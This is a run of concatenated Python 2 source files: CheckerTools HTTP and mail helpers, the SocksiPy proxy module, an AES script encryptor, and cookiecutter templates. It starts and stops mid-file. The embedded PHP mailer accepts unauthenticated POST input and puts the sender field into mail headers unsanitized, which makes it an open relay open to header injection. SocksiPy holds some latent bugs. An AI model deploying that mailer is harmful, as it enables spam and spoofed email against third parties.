    def attach(self, filename):
        """
        Attach a file to the email. Specify the name of the file;
        Message will figure out the MIME type and load the file.
        """
        
        self.attachments.append(filename)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
CheckerTools v1.4.0 (27.12.2010) by Bystroushaak (bystrousak@kitakitsune.org)
This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
Created in Geany text editor. This module uses epydoc.

    Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
    emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
    U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
    i nekomu jinemu nez me. Diky.

    If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
    something about where you use this script, or just a message that this script is useful for you.
    For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
    Thanks.
"""
#===============================================================================
# Imports ======================================================================
#===============================================================================
import urllib
import urllib2
import re
import base64
import os.path
import mimetypes


#===============================================================================
# Variables ====================================================================
#===============================================================================
IEHeaders = {
    "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
    "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
    "Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
    "Accept-Charset": "utf-8; windows-1250",
    "Keep-Alive": "300",
    "Connection": "keep-alive",
}
"Headers from Internet explorer."

LFFHeaders = {
    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686; cs; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3",
    "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain",
    "Accept-Language": "cs,en-us;q=0.7,en;q=0.3",
    "Accept-Charset": "utf-8; windows-1250",
    "Keep-Alive": "300",
    "Connection": "keep-alive",
}
"Headers from Firefox 3.6.3 on linux."

PHPMailerSrc = r"""<?php
// Simple mailer v2.0.0 (27.12.2010) by Bystroushaak (bystrousak@kitakitsune.org)
// This code is part of http://kitakitsune.org/texty/tools/CheckerTools.html
if (isset($_POST["from"]) && isset($_POST["to"]) && isset($_POST["subj"]) && isset($_POST["msg"])){
    $headers = "From: ".$_POST["from"]."\r\n"."Reply-To: ".$_POST["from"]."\r\nX-Mailer: PHP/".phpversion();
    $message = $_POST["msg"];
    if (isset($_POST["file"]) && isset($_POST["filename"]) && isset($_POST["filetype"])){
        $semi_rand = md5(date('r', time()));
        $mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";
        $headers .= "MIME-Version: 1.0\nContent-Type: multipart/mixed;\n boundary=\"{$mime_boundary}\"";
        $message = "This is a multi-part message in MIME format.\n\n--{$mime_boundary}\nContent-type: text/html; charset=utf-8\n"."Content-Transfer-Encoding: 7bit\n\n".$_POST["msg"]."\n\n".
        "--{$mime_boundary}\n"."Content-Type: {$_POST["filetype"]};\n name=\"{$_POST["filename"]}\"\n".
        "Content-Disposition: attachment;\n filename=\"{$_POST["filename"]}\"\n".
        "Content-Transfer-Encoding: base64\n\n".chunk_split($_POST["file"])."\n\n--{$mime_boundary}--\n";
    }
    mail($_POST["to"], $_POST["subj"], $message, $headers) or Die("Error!");
    echo "ok";
}else{
    echo "error!\n";
    if (!isset($_POST["from"]))
        echo ">> Parameter \"from\" not set!";
    if (!isset($_POST["to"]))
        echo ">> Parameter \"to\" not set!";
    if (!isset($_POST["subj"]))
        echo ">> Parameter \"subj\" not set!";
    if (!isset($_POST["msg"]))
        echo ">> Parameter \"msg\" not set!";
}?>
"""
"Source code of simple PHP mailer."

PHPMAILERURL = "http://bystrousak.sweb.cz/mailer.php"
"URL of PHPMailer."

hcookies = False
cookies = {}
"Variable where are stored cookies."

__version = "1.4.0"

#===============================================================================
#= Functions & objects =========================================================
#===============================================================================
def getDomain(url):
    """
    Parse domain from url.
    
    @param url: URL
    @type  url: string
    
    @return: Domain
    @rtype:  string
    """
    if "://" in url:
        url = url.split("://")[1]
        
    if "/" in url:
        url = url.split("/")[0]

    return url

def getPage(url, param = None, headers = IEHeaders, getparam = None, handle_cookies = False):
    """
    Function for easy work with HTTP protocol.
    
    @param url: URL - if not "://" in url, url will be transformed into "http://" + url
    @type  url: string
    
    @param param: Parameters for url. Default None.
    @type  param: dictionary
    
    @param headers: Headers sended when downloading url. Default IEHeaders.
    @type  headers: dictionary
    @see: IEHeaders
    @see: LFFHeaders
    
    @param getparam: Params which will be sended as GET.
    @type  getparam: dictionary
    
    @param handle_cookies: If True, function will use cookies. This is not absolutely
                           sure, so use it at your own risk.
                           Cookies are stored in global variable cookies.
                           If you dont want set this parameter to true with every call,
                           you can set global variable hcookies to True.
    @type  handle_cookies: bool
    
    @return: content of downloaded url
    @rtype: Binary data or text, depends on type of downloaded content.
    """
    # POST params
    if param != None:
        param = urllib.urlencode(param)
        
    # GET params
    if getparam != None:
        getparam = urllib.urlencode(getparam)
        if "?" in url:
            if url[-1] == "&":
                url += getparam
            else:
                url += "&" + getparam
        else:
            url += "?" + getparam
            
        getparam = None
       
    # url protocol check
    if not "://" in url:
        url = "http://" + url

    # add cokies into headers
    if hcookies or handle_cookies:
        domain = getDomain(url)
        if domain in cookies.keys():
            cookie_string = ""
            for key in cookies[domain].keys():
                cookie_string += key + "=" + str(cookies[domain][key]) + "; "
                
            headers["Cookie"] = cookie_string.strip()

    # download page    
    f = urllib2.urlopen(urllib2.Request(url, param, headers))
    data = f.read()
    
    # simple cookies handling
    if hcookies or handle_cookies:
        cs = f.info().items()   # get header from server
        #print cs
        # parse "set-cookie" string
        cookie_string = ""
        for c in cs:
            if c[0] == "set-cookie":
                cookie_string = c[1]
                    
        # parse keyword:values
        tmp_cookies = {}
        for c in cookie_string.split(","):
            cookie = c
            if ";" in c:
                cookie = c.split(";")[0]
            cookie = cookie.strip()
            
            cookie = cookie.split("=")
            keyword = cookie[0]
            value = "=".join(cookie[1:])
            
            tmp_cookies[keyword] = value
        
        # append global variable cookis with new cookies
        if len(tmp_cookies) > 0:
            domain = getDomain(url)
            
            if domain in cookies.keys():
                for key in tmp_cookies.keys():
                    cookies[domain][key] = tmp_cookies[key] 
            else:
                cookies[domain] = tmp_cookies
              
        # check for blank cookies
        if len(cookies) > 0:
            for domain in cookies.keys():
                for key in cookies[domain].keys():
                    if cookies[domain][key].strip() == "":
                        del cookies[domain][key]
                
                if len(cookies[domain]) == 0:
                    del cookies[domain]                
        
    f.close()

    return data
 
    
def removeTags(txt):
    """
    Remove tags from text. Every text field between < and > will be deleted.
    
    @param txt: Text which will be cleared.
    @type  txt: string
    
    @return: Cleared text.
    @rtype:  string
    """
    for i in re.findall(r"""<(?:"[^"]*"['"]*|'[^']*'['"]*|[^'">])+>""", txt):
        txt = txt.replace(i, "")
        
    return txt.strip()


def getVisibleText(txt):
    """
    Removes tags and text between <title>, <script> and <style> tags.

    @param txt: Text which will be cleared.
    @type  txt: string

    @return: Cleared text.
    @rtype:  string
    """
    for i in re.findall(r"""<script.*?>[\s\S]*?</.*?script>""", txt):
        txt = txt.replace(i, "")

    for i in re.findall(r"""<style.*?>[\s\S]*?</.*?style>""", txt):
        txt = txt.replace(i, "")

    for i in re.findall(r"""<title.*?>[\s\S]*?</.*?title>""", txt):
        txt = txt.replace(i, "")

    return removeTags(txt)
    

def sendMail(fromwho, to, subj, text, filename = None, url = PHPMAILERURL):  # from is python keyword, so i have to use fromwho
    """
    This function allows send mail from python without installed mailserver. Function
    uses remote PHP script on freehosting. Source code of PHP script is saved in PHPMailerSrc.
    
    @param fromwho: Email adress of sender.
    @type  fromwho: string
    
    @param to: Email adress of recipient.
    @type  to: string
    
    @param subj: Subject of email.
    @type  subj: string
    
    @param url: URL of your own PHPMailer. I uploaded PHPMailer on freehosting, but is 
                possible that there is some quotes to sending emails, so I thing that will
                be better if you will somewhere upload your own PHP script.
                URL must start with http:// prefix!
    @type  url: string
    
    @param filename: Filename. File must exist!
    @type  filename: string
    
    @see: getPage()
    
    @raise UserWarning: If found bad parameters.
    @raise IOException: If cant download page. Printed message contents source code of PHPMailer.
    @raise ValueError:  If find bad email adress or blank subject or msg.

    @return: True if sucessfully send email, False if not.
    @rtype:  bool
    """
    def printSendMailError():
        print ">> Error, cant download", url
        print ">> Check your connection and visit url."
        print ">> If page doesnt exists, upload on some freehosting following code and use"
        print ">> parameter url, or permanently change header of this function"
        print "-" * 10
        print PHPMailerSrc
        print "-" * 10
        
    mailexp = r"""(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])"""
    
    if len(re.findall(mailexp, to)) != 1:
        raise ValueError("Bad mail adress!")
        
    if len(subj) == 0 and len(text) == 0:
        raise ValueError("Cant send completly blank email! Try add subject or msg.")
    
    param = {
        "from" : fromwho,
        "to"   : to,
        "subj" : subj,
        "msg"  : text
    }
    
    if (filename != None):
        if os.path.exists(filename):
            file = open(filename, "rb")
            content = file.read()
            file.close()
            
            param["file"] = base64.b64encode(content)
            param["filetype"] = mimetypes.guess_type(filename)[0]
            param["filename"] = os.path.basename(filename)
        else:
            raise UserWarning("File \"" + filename + "\" not found!")
    
    try:
        data = getPage(url, param)
    except Exception, e:
        printSendMailError()
        raise e
        
    data = getVisibleText(data)
        
    if data == "ok":
        return True
    elif data.startswith("error!"):
        raise UserWarning(data)
    else:
        print "= Received data ==="
        print data
        print "==================="
        printSendMailError()
        return False


#===============================================================================
#= Main program ================================================================
#===============================================================================
if __name__ == "__main__":
    print "CheckerTools v1.3.0 (06.06.2010) by Bystroushaak (bystrousak@kitakitsune.org)""""SocksiPy - Python SOCKS module.
Version 1.00

Copyright 2006 Dan-Haim. All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:
1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.
3. Neither the name of Dan Haim nor the names of his contributors may be used
   to endorse or promote products derived from this software without specific
   prior written permission.
   
THIS SOFTWARE IS PROVIDED BY DAN HAIM "AS IS" AND ANY EXPRESS OR IMPLIED
WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO
EVENT SHALL DAN HAIM OR HIS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA
OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMANGE.


This module provides a standard socket-like interface for Python
for tunneling connections through SOCKS proxies.

"""

import socket
import struct

PROXY_TYPE_SOCKS4 = 1
PROXY_TYPE_SOCKS5 = 2
PROXY_TYPE_HTTP = 3

_defaultproxy = None
_orgsocket = socket.socket

class ProxyError(Exception):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class GeneralProxyError(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class Socks5AuthError(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class Socks5Error(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class Socks4Error(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

class HTTPError(ProxyError):
	def __init__(self, value):
		self.value = value
	def __str__(self):
		return repr(self.value)

_generalerrors = ("success",
		   "invalid data",
		   "not connected",
		   "not available",
		   "bad proxy type",
		   "bad input")

_socks5errors = ("succeeded",
		  "general SOCKS server failure",
		  "connection not allowed by ruleset",
		  "Network unreachable",
		  "Host unreachable",
		  "Connection refused",
		  "TTL expired",
		  "Command not supported",
		  "Address type not supported",
		  "Unknown error")

_socks5autherrors = ("succeeded",
		      "authentication is required",
		      "all offered authentication methods were rejected",
		      "unknown username or invalid password",
		      "unknown error")

_socks4errors = ("request granted",
		  "request rejected or failed",
		  "request rejected because SOCKS server cannot connect to identd on the client",
		  "request rejected because the client program and identd report different user-ids",
		  "unknown error")

def setdefaultproxy(proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
	"""setdefaultproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
	Sets a default proxy which all further socksocket objects will use,
	unless explicitly changed.
	"""
	global _defaultproxy
	_defaultproxy = (proxytype,addr,port,rdns,username,password)
	
class socksocket(socket.socket):
	"""socksocket([family[, type[, proto]]]) -> socket object
	
	Open a SOCKS enabled socket. The parameters are the same as
	those of the standard socket init. In order for SOCKS to work,
	you must specify family=AF_INET, type=SOCK_STREAM and proto=0.
	"""
	
	def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, _sock=None):
		_orgsocket.__init__(self,family,type,proto,_sock)
		if _defaultproxy != None:
			self.__proxy = _defaultproxy
		else:
			self.__proxy = (None, None, None, None, None, None)
		self.__proxysockname = None
		self.__proxypeername = None
	
	def __recvall(self, bytes):
		"""__recvall(bytes) -> data
		Receive EXACTLY the number of bytes requested from the socket.
		Blocks until the required number of bytes have been received.
		"""
		data = ""
		while len(data) < bytes:
			data = data + self.recv(bytes-len(data))
		return data
	
	def setproxy(self,proxytype=None,addr=None,port=None,rdns=True,username=None,password=None):
		"""setproxy(proxytype, addr[, port[, rdns[, username[, password]]]])
		Sets the proxy to be used.
		proxytype -	The type of the proxy to be used. Three types
				are supported: PROXY_TYPE_SOCKS4 (including socks4a),
				PROXY_TYPE_SOCKS5 and PROXY_TYPE_HTTP
		addr -		The address of the server (IP or DNS).
		port -		The port of the server. Defaults to 1080 for SOCKS
				servers and 8080 for HTTP proxy servers.
		rdns -		Should DNS queries be preformed on the remote side
				(rather than the local side). The default is True.
				Note: This has no effect with SOCKS4 servers.
		username -	Username to authenticate with to the server.
				The default is no authentication.
		password -	Password to authenticate with to the server.
				Only relevant when username is also provided.
		"""
		self.__proxy = (proxytype,addr,port,rdns,username,password)
	
	def __negotiatesocks5(self,destaddr,destport):
		"""__negotiatesocks5(self,destaddr,destport)
		Negotiates a connection through a SOCKS5 server.
		"""
		# First we'll send the authentication packages we support.
		if (self.__proxy[4]!=None) and (self.__proxy[5]!=None):
			# The username/password details were supplied to the
			# setproxy method so we support the USERNAME/PASSWORD
			# authentication (in addition to the standard none).
			self.sendall("\x05\x02\x00\x02")
		else:
			# No username/password were entered, therefore we
			# only support connections with no authentication.
			self.sendall("\x05\x01\x00")
		# We'll receive the server's response to determine which
		# method was selected
		chosenauth = self.__recvall(2)
		if chosenauth[0] != "\x05":
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		# Check the chosen authentication method
		if chosenauth[1] == "\x00":
			# No authentication is required
			pass
		elif chosenauth[1] == "\x02":
			# Okay, we need to perform a basic username/password
			# authentication.
			self.sendall("\x01" + chr(len(self.__proxy[4])) + self.__proxy[4] + chr(len(self.proxy[5])) + self.__proxy[5])
			authstat = self.__recvall(2)
			if authstat[0] != "\x01":
				# Bad response
				self.close()
				raise GeneralProxyError((1,_generalerrors[1]))
			if authstat[1] != "\x00":
				# Authentication failed
				self.close()
				raise Socks5AuthError,((3,_socks5autherrors[3]))
			# Authentication succeeded
		else:
			# Reaching here is always bad
			self.close()
			if chosenauth[1] == "\xFF":
				raise Socks5AuthError((2,_socks5autherrors[2]))
			else:
				raise GeneralProxyError((1,_generalerrors[1]))
		# Now we can request the actual connection
		req = "\x05\x01\x00"
		# If the given destination address is an IP address, we'll
		# use the IPv4 address request even if remote resolving was specified.
		try:
			ipaddr = socket.inet_aton(destaddr)
			req = req + "\x01" + ipaddr
		except socket.error:
			# Well it's not an IP number,  so it's probably a DNS name.
			if self.__proxy[3]==True:
				# Resolve remotely
				ipaddr = None
				req = req + "\x03" + chr(len(destaddr)) + destaddr
			else:
				# Resolve locally
				ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
				req = req + "\x01" + ipaddr
		req = req + struct.pack(">H",destport)
		self.sendall(req)
		# Get the response
		resp = self.__recvall(4)
		if resp[0] != "\x05":
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		elif resp[1] != "\x00":
			# Connection failed
			self.close()
			if ord(resp[1])<=8:
				raise Socks5Error(ord(resp[1]),_generalerrors[ord(resp[1])])
			else:
				raise Socks5Error(9,_generalerrors[9])
		# Get the bound address/port
		elif resp[3] == "\x01":
			boundaddr = self.__recvall(4)
		elif resp[3] == "\x03":
			resp = resp + self.recv(1)
			boundaddr = self.__recvall(resp[4])
		else:
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		boundport = struct.unpack(">H",self.__recvall(2))[0]
		self.__proxysockname = (boundaddr,boundport)
		if ipaddr != None:
			self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
		else:
			self.__proxypeername = (destaddr,destport)
	
	def getproxysockname(self):
		"""getsockname() -> address info
		Returns the bound IP address and port number at the proxy.
		"""
		return self.__proxysockname
	
	def getproxypeername(self):
		"""getproxypeername() -> address info
		Returns the IP and port number of the proxy.
		"""
		return _orgsocket.getpeername(self)
	
	def getpeername(self):
		"""getpeername() -> address info
		Returns the IP address and port number of the destination
		machine (note: getproxypeername returns the proxy)
		"""
		return self.__proxypeername
	
	def __negotiatesocks4(self,destaddr,destport):
		"""__negotiatesocks4(self,destaddr,destport)
		Negotiates a connection through a SOCKS4 server.
		"""
		# Check if the destination address provided is an IP address
		rmtrslv = False
		try:
			ipaddr = socket.inet_aton(destaddr)
		except socket.error:
			# It's a DNS name. Check where it should be resolved.
			if self.__proxy[3]==True:
				ipaddr = "\x00\x00\x00\x01"
				rmtrslv = True
			else:
				ipaddr = socket.inet_aton(socket.gethostbyname(destaddr))
		# Construct the request packet
		req = "\x04\x01" + struct.pack(">H",destport) + ipaddr
		# The username parameter is considered userid for SOCKS4
		if self.__proxy[4] != None:
			req = req + self.__proxy[4]
		req = req + "\x00"
		# DNS name if remote resolving is required
		# NOTE: This is actually an extension to the SOCKS4 protocol
		# called SOCKS4A and may not be supported in all cases.
		if rmtrslv==True:
			req = req + destaddr + "\x00"
		self.sendall(req)
		# Get the response from the server
		resp = self.__recvall(8)
		if resp[0] != "\x00":
			# Bad data
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		if resp[1] != "\x5A":
			# Server returned an error
			self.close()
			if ord(resp[1]) in (91,92,93):
				self.close()
				raise Socks4Error((ord(resp[1]),_socks4errors[ord(resp[1])-90]))
			else:
				raise Socks4Error((94,_socks4errors[4]))
		# Get the bound address/port
		self.__proxysockname = (socket.inet_ntoa(resp[4:]),struct.unpack(">H",resp[2:4])[0])
		if rmtrslv != None:
			self.__proxypeername = (socket.inet_ntoa(ipaddr),destport)
		else:
			self.__proxypeername = (destaddr,destport)
	
	def __negotiatehttp(self,destaddr,destport):
		"""__negotiatehttp(self,destaddr,destport)
		Negotiates a connection through an HTTP server.
		"""
		# If we need to resolve locally, we do this now
		if self.__proxy[3] == False:
			addr = socket.gethostbyname(destaddr)
		else:
			addr = destaddr
		self.sendall("CONNECT " + addr + ":" + str(destport) + " HTTP/1.1\r\n" + "Host: " + destaddr + "\r\n\r\n")
		# We read the response until we get the string "\r\n\r\n"
		resp = self.recv(1)
		while resp.find("\r\n\r\n")==-1:
			resp = resp + self.recv(1)
		# We just need the first line to check if the connection
		# was successful
		statusline = resp.splitlines()[0].split(" ",2)
		if statusline[0] not in ("HTTP/1.0","HTTP/1.1"):
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		try:
			statuscode = int(statusline[1])
		except ValueError:
			self.close()
			raise GeneralProxyError((1,_generalerrors[1]))
		if statuscode != 200:
			self.close()
			raise HTTPError((statuscode,statusline[2]))
		self.__proxysockname = ("0.0.0.0",0)
		self.__proxypeername = (addr,destport)
	
	def connect(self,destpair):
		"""connect(self,despair)
		Connects to the specified destination through a proxy.
		destpar - A tuple of the IP/DNS address and the port number.
		(identical to socket's connect).
		To select the proxy server use setproxy().
		"""
		# Do a minimal input check first
		if (type(destpair) in (list,tuple)==False) or (len(destpair)<2) or (type(destpair[0])!=str) or (type(destpair[1])!=int):
			raise GeneralProxyError((5,_generalerrors[5]))
		if self.__proxy[0] == PROXY_TYPE_SOCKS5:
			if self.__proxy[2] != None:
				portnum = self.__proxy[2]
			else:
				portnum = 1080
			_orgsocket.connect(self,(self.__proxy[1],portnum))
			self.__negotiatesocks5(destpair[0],destpair[1])
		elif self.__proxy[0] == PROXY_TYPE_SOCKS4:
			if self.__proxy[2] != None:
				portnum = self.__proxy[2]
			else:
				portnum = 1080
			_orgsocket.connect(self,(self.__proxy[1],portnum))
			self.__negotiatesocks4(destpair[0],destpair[1])
		elif self.__proxy[0] == PROXY_TYPE_HTTP:
			if self.__proxy[2] != None:
				portnum = self.__proxy[2]
			else:
				portnum = 8080
			_orgsocket.connect(self,(self.__proxy[1],portnum))
			self.__negotiatehttp(destpair[0],destpair[1])
		elif self.__proxy[0] == None:
			_orgsocket.connect(self,(destpair[0],destpair[1]))
		else:
			raise GeneralProxyError((4,_generalerrors[4]))
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# encryptPy.py v1.0.0 (10.09.2009) by Bystroushaak - bystrousak@kitakitsune.org.
#
#  Pomoci 256b AES zasifruje vstupni .py soubor, takze k jeho spusteni bude zapotrebi heslo.
#  Encrypt input .py file with 256b AES, so you will need password for execute.
#
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in gedit text editor.
#
## Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
## emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
## U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
## i nekomu jinemu nez me. Diky
#
# imports
import sys

from Crypto.Cipher import AES
import base64
import md5
import sha
import getpass

# outdata - imports
imports= """#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Encrypted by encryptPy (http://kitakitsune.org/texty/tools/encryptPy.html)

import sys
from Crypto.Cipher import AES
import base64
import md5
import sha
import getpass
"""

# outdata - encrypt functions
fcions= """
def getPasswd():
    passwd = sha.new(getpass.getpass("Passwd: ")).hexdigest()
    passwd2 = passwd[:20]
    passwd = passwd[20:]

    for i in range(2204):
        passwd += sha.new(passwd + str(i * (i % 4))).hexdigest()
        passwd2 += md5.new(passwd + str(i * (i % 7))).hexdigest()

    return md5.new(passwd + passwd2).hexdigest()

def decdata(passwd, data):
    aes = AES.new(passwd, AES.MODE_CFB)

    return aes.decrypt(base64.b64decode(data))
    
"""

# outdata - main program
code= """\n
try:
    passwd= getPasswd()
    exec(decdata(passwd, AESdata))
except TypeError:
    print "Bad password!"
"""

# functions & objects
## return hash of passwd
def getPasswd():
    passwd = sha.new(getpass.getpass("Passwd: ")).hexdigest()
    passwd2 = passwd[:20]
    passwd = passwd[20:]

    for i in range(2204):
        passwd += sha.new(passwd + str(i * (i % 4))).hexdigest()
        passwd2 += md5.new(passwd + str(i * (i % 7))).hexdigest()

    return md5.new(passwd + passwd2).hexdigest()

## enctypt data with passwd
def encdata(passwd, data):
    aes = AES.new(passwd, AES.MODE_CFB)

    return base64.b64encode(aes.encrypt(data))

## decode data with passwd
def decdata(passwd, data):
    aes = AES.new(passwd, AES.MODE_CFB)

    return aes.decrypt(base64.b64decode(data))
    
def printHelp():
    print """usage:
    python encryptPy.py -e infile outfile
        -e or --encode
            Encode infile into outfile.
            
        -d or --decode
            Decode infile into outfile
            
            """
            
    sys.exit()

# parse cmd args (filenam etc..)
def parseArgs():
    what = "e"

    argv = sys.argv
    if len(argv) > 1 and len(argv) <= 4:
        for i in range(len(argv)):
            if argv[i].startswith("--help") or argv[i].startswith("-h"):
                print "Help:"
                printHelp()
            elif argv[i].startswith("-d") or argv[i].startswith("--decode"):
                what = "d"
            elif argv[i].startswith("-e") or argv[i].startswith("--encode"):
                what = "e"

        try:
            infile = argv[len(argv) - 2]
            outfile = argv[len(argv) - 1]
        except:
            print "You must specify input and output files!"
            printHelp()
    else:
        print "Bad arguments!"
        printHelp()

    return infile, outfile, what
   
## breaks string into num chars long lines
def breakTo(string, num= 80):
    ostr= ""
    
    for i in range(len(string)):
        ostr+= string[i]
        if i % num == 0:
            ostr+= "\n"
            
    return ostr



# main program
infile, outfile, what= parseArgs()

# read input file
try:
    file = open(infile, "r")
    data = file.read()
    file.close()
except IOError, e:
    print "Error!"
    print "Infile \"" + infile + "\" not found!"
    printHelp()
    sys.exit()

passwd= getPasswd() # read passwds

# what to do
if what == "e":                     # encrypt data
    AESdata= encdata(passwd, data)
    odata= imports + fcions + "AESdata= \"\"\"\n" + breakTo(AESdata, 80) + "\n\"\"\"" + code    # create output
else:                               # decrypt data
    data= data.splitlines()
    
    # parse AESdata string
    AESdata= ""
    lck= False
    for i in data:
        if lck and i.endswith("\"\"\""):
            AESdata+= i
            break
        if lck:
            AESdata+= i
        if i.startswith("AESdata= ") and not lck:
            AESdata+= i
            lck= True
                
    odata= decdata(passwd, "".join(AESdata[12:-3].splitlines()))
    
# save output file
try:
    file = open(outfile, "w")
    file.write(odata)
    file.close()
except IOError, e:
    print "Error!"
    print "Outfile \"" + outfile + "\" couldn't be saved!"
    print "Read only filesystem or not enough space on drive."
    sys.exit()
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================



# Variables ===================================================================



# Functions & classes =========================================================



# Main program ================================================================
if __name__ == '__main__':
    pass
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#


def allSame(s):
    return not any(filter(lambda x: x != s[0], s))


def hasDigit(s):
    return any(char.isdigit() for char in s)


def getVersion(data):
    """
    Parse version from changelog written in RST format.
    """
    data = data.splitlines()
    return next((
        v
        for v, u in zip(data, data[1:])  # v = version, u = underline
        if len(v) == len(u) and allSame(u) and hasDigit(v) and "." in v
    ))
#! /usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import urllib

sys.path.append('../src/{{cookiecutter.repo_name}}')

extensions = [
    'sphinx.ext.autodoc',
    'sphinx.ext.viewcode',
    'sphinxcontrib.napoleon',
    'sphinx.ext.intersphinx'
]

# Napoleon settings
napoleon_google_docstring = True
napoleon_numpy_docstring = False
napoleon_include_private_with_doc = False
napoleon_include_special_with_doc = True

# Sorting of items
autodoc_member_order = "bysource"

# Document all methods in classes
autoclass_content = 'both'

# Add any paths that contain templates here, relative to this directory.
templates_path = ['_templates']

# The suffix of source filenames.
source_suffix = '.rst'

# The master toctree document.
master_doc = 'index'

# General information about the project.
project = '{{cookiecutter.repo_name}}'
copyright = '{{ cookiecutter.year }}, {{cookiecutter.full_name}}'

# The full version, including alpha/beta/rc tags.
try:
    # read data from CHANGES.rst
    sys.path.insert(0, os.path.abspath('../'))
    from docs import getVersion
    release = getVersion(open("../CHANGES.rst").read())
except:
    # this is here specially for readthedocs, which downloads only docs, not
    # other files
    fh = urllib.urlopen("https://pypi.python.org/pypi/" + project + "/")
    release = filter(lambda x: "<title>" in x, fh.read().splitlines())
    release = release[0].split(":")[0].split()[1]

# List of patterns, relative to source directory, that match files and
# directories to ignore when looking for source files.
exclude_patterns = ['_build']

# The name of the Pygments (syntax highlighting) style to use.
pygments_style = 'sphinx'

# The theme to use for HTML and HTML Help pages.  See the documentation for
# a list of builtin themes.
html_theme = 'default'

# Add any paths that contain custom static files (such as style sheets) here,
# relative to this directory. They are copied after the builtin static files,
# so a file named "default.css" will overwrite the builtin "default.css".
html_static_path = ['_static']

# If true, links to the reST sources are added to the pages.
html_show_sourcelink = True

# Output file base name for HTML help builder.
htmlhelp_basename = project
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from setuptools import setup, find_packages

from docs import getVersion


# Variables ===================================================================
CHANGELOG = open('CHANGES.rst').read()
LONG_DESCRIPTION = "\n\n".join([
    open('README.rst').read(),
    CHANGELOG
])


# Actual setup definition =====================================================
setup(
    name='{{ cookiecutter.repo_name }}',
    version=getVersion(CHANGELOG),
    description='{{ cookiecutter.project_short_description }}',
    long_description=LONG_DESCRIPTION,
    url='https://github.com/{{ cookiecutter.github_username }}/{{ cookiecutter.repo_name }}',

    author='{{ cookiecutter.full_name }}',
    author_email='{{ cookiecutter.email }}',

    classifiers=[
        'Intended Audience :: Developers',
        "Programming Language :: Python :: 2",
